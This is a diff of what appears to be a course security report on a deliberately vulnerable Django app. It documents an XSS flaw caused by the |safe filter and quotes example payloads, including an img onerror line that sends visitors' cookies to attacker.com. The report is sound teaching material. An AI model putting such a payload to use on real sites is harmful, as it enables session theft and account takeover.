@@ -29,7 +29,7 @@ How to fix: Set DEBUG=False in production environments. Implement environment-ba
 
 
 ### FLAW 4: A03:2021 – Injection (Cross-Site Scripting)
-Source: https://github.com/LHuldin/csbproject/blob/main/accounts/templates/accounts/notes.html#L21
+Source: https://github.com/LHuldin/csbproject/blob/main/accounts/templates/accounts/notes.html#L17
 
 Description: The application contains a Cross-Site Scripting (XSS) vulnerability in the notes display functionality. The template uses Django's |safe filter to render user-generated content without proper sanitization or validation. While Django automatically escapes HTML characters for security, the |safe filter explicitly bypasses this protection mechanism. When users create notes containing malicious JavaScript code such as <script>alert('XSS!');</script> or <img src="x" onerror="document.location='http://attacker.com/steal.php?cookie='+document.cookie">, this code executes in every visitor's browser. This enables attackers to steal session cookies, redirect users to malicious sites, perform actions on behalf of victims, and potentially compromise user accounts.
 
